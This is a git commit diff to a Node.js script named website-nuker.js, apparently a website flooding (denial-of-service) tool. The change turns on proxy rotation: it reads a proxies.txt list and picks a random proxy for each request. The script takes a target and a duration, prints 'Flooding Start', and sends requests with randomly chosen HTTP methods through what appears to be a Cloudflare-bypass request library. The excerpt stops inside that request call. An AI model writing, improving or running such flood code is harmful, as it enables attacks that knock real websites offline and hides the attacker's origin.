9a30108d4d101f40408529efdea92c604a0d3d21
z3ntl3 root <48758770+Z3NTL3@users.noreply.github.com>
2021-05-27 22:35:25 +0200

    Update website-nuker.js

--- website-nuker.js
+++ website-nuker.js
@@ -20,13 +20,13 @@ if (process.argv.length !== 4) {
 const target = process.argv[2],
     time = process.argv[3];
 console.log("Flooding Start")
-//let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
+let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 function randomNumber(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function send_req() {
-	//let proxy = proxies[Math.floor(Math.random() * proxies.length)];
+	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
 		var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
 		var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
 		cf.request({
